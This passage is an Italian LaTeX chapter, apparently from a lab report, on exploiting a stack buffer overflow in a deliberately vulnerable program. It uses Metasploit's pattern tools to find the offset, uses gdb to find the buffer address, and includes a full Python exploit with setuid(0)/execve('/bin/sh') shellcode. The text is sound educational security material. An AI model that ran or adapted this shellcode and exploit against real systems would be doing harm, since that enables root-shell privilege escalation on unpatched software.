\documentclass[main.tex]{subfiles}
\begin{document}
\section{Creazione dell'exploit}\label{sec:cap 3}

Una volta disattivate le principali misure di sicurezza e compilato il programma vulnerabile, è possibile procedere alla costruzione di un exploit, cioè di un input appositamente creato per sfruttare il buffer overflow e alterare il normale flusso di esecuzione del programma.

\noindent L’obiettivo è sovrascrivere il return address salvato nello stack con un valore controllato, in modo da far eseguire codice arbitrario (la shell) al termine della funzione vulnerable().

\noindent Per farlo, è necessario:

\begin{itemize}
    \item Riempire il buffer fino al return address,
    \item Sovrascrivere il return address con l’indirizzo di una \textbf{shellcode},
    \item Posizionare la shellcode in una zona accessibile ed eseguibile, come lo stesso buffer.
\end{itemize}

\subsubsection*{Calcolare l'offset:}

\noindent Il primo passo fondamentale è individuare con precisione l’\textbf{offset}, ovvero la distanza (in byte) tra l’inizio del buffer vulnerabile e la posizione in memoria in cui viene sovrascritto il \textbf{return address} (registro EIP). Questo valore è essenziale per posizionare correttamente il payload all’interno dell’input.


\noindent Abbiamo utilizzato un pattern di input univoco e non ripetitivo, generato con lo script \verb|pattern_create.rb| incluso nel framework Metasploit (presente di default in Kali Linux). Questo pattern consente di identificare esattamente quale parte della stringa va a sovrascrivere il registro EIP al momento del crash.\\

\noindent
\texttt{/usr/share/metasploit-framework/tools/exploit/pattern\_create.rb -l 150 > pattern.txt}\\

\noindent Successivamente, si avvia il debugger gdb con il comando da terminale \texttt{gdb ./vuln}, all'interno di gdb si digita \texttt{run < pattern.txt} mandando il programma in crash; 
successivamente con il comando \texttt{info registers eip } ci verrà restituito un output del tipo: \texttt{eip            0x64413764          0x64413764
}.\\

\noindent
Questo valore viene inserito poi  nel tool \verb|pattern_offset.rb| per risalire all’offset preciso con il comando: \\
\texttt{/usr/share/metasploit-framework/tools/exploit/pattern\_offset.rb -q 64413764
}\\
\noindent 
Il risultato sarà un output simile a:
\texttt{Exact match at offset 112}

\newpage

\noindent
\textbf{Trovare l'indirizzo del buffer:}\\

\noindent
L’indirizzo di memoria del buffer è il punto in cui andremo a posizionare la shellcode. Per individuarlo, impostiamo un breakpoint nella funzione \verb|vulnerable| del nostro codice sorgente \verb|.c| usando GDB.\\
Da terminale digitiamo \texttt{gdb ./vuln} e all'interno di gdb digitiamo prima \texttt{break vulnerable} e successivamente \texttt{run}, quando il programma si ferma al break event point, digitiamo  \texttt{print \&buffer}, ottenendo un otuput del tipo: \\


\begin{figure}[h]
    \centering
    \includegraphics[width=1\textwidth]{figures/bufferAdd.png}
    \caption{Terminale di gdb con la stampa del buffer address.}
    \label{fig:esempio}
\end{figure}

\noindent
Il valore \verb|0xbfffef3c| è l’indirizzo del buffer, che useremo per costruire l’exploit.\\


\noindent
\textbf{Creazione dell'exploit in python:}\\

\noindent
Una volta calcolati l’offset e l’indirizzo del buffer, è possibile procedere alla creazione dell’exploit vero e proprio. L’exploit consiste in un \textit{payload} binario composto da tre elementi fondamentali: una shellcode che rappresenta il codice malevolo da eseguire, un \textit{padding} (riempimento) per raggiungere il return address, e infine il valore con cui sovrascrivere il return address, che deve puntare alla shellcode o a una zona vicina come il NOP sled.\\
Nel nostro caso, l’exploit è stato costruito in Python, utilizzando la libreria \verb|struct| per generare correttamente l’indirizzo in formato little-endian.\\
\newpage

\begin{lstlisting}[style=mypython]
import struct

buffer_addr = 0xbfffef3c    # indirizzo del buffer address
offset = 112                # offset calcolato precedentemente

shellcode = (
    b"\x90" * 39 +               # NOP sled
    # setuid(0)
    b"\x31\xc0"                  # xor eax,eax
    b"\x31\xdb"                  # xor ebx,ebx
    b"\xb0\x17"                  # mov al,0x17 (syscall setuid)
    b"\xcd\x80"                  # int 0x80
    # execve("/bin//sh")
    b"\x50"                      # push eax (0 terminator)
    b"\x68\x2f\x2f\x73\x68"      # push "//sh"
    b"\x68\x2f\x62\x69\x6e"      # push "/bin"
    b"\x89\xe3"                  # mov ebx,esp
    b"\x50"                      # push eax
    b"\x53"                      # push ebx
    b"\x89\xe1"                  # mov ecx,esp
    b"\xb0\x0b"                  # mov al,0xb (execve syscall)
    b"\xcd\x80"                  # int 0x80
)

# Questo crea una sequenza di caratteri "A" lunga   
# quanto basta per riempire il buffer fino al return address.
padding = b"A" * (offset - len(shellcode))

# converte l'indirizzo di ritorno in formato little-indian
ret = struct.pack("<I", 0xbfffef8c) 

# Costruiamo il payload completo e scriviamo il file paylaod.bin
payload = shellcode + padding + ret * 4
with open("payload.bin", "wb") as f:
    f.write(payload)

print(f"Payload creato, lunghezza: {len(payload)}")
print(f"Return address usato: {hex(buffer_addr + 20)}")
print("Lunghezza shellcode:", len(shellcode))
print("Lunghezza padding:", len(padding))
print("Totale prima del ret:", len(shellcode) + len(padding))
print("Offset:", offset)

\end{lstlisting}

\noindent L’exploit consiste in un file in python ( exploit.py) che genera un \textit{payload} binario composto da tre elementi fondamentali: una shellcode che rappresenta il codice malevolo da eseguire, un \textit{padding} (riempimento) per raggiungere il return address, e infine il valore con cui sovrascrivere il return address, che deve puntare alla shellcode o a una zona vicina come il NOP sled (una sequenza di istruzioni NOP destinata a "scorrere" il flusso di esecuzione delle istruzioni della CPU).\\

\noindent Successivamente compiliamo il file exploit.py con il comando da terminale \texttt{python3 exploit.py} avendo come output: 

\begin{figure}[h]
    \centering
    \includegraphics[width=0.5\textwidth]{figures/compExploit.png}
    \caption{Output della compilazione del file exploit.py da terminale}
    \label{fig:esempio}
\end{figure}





\end{document}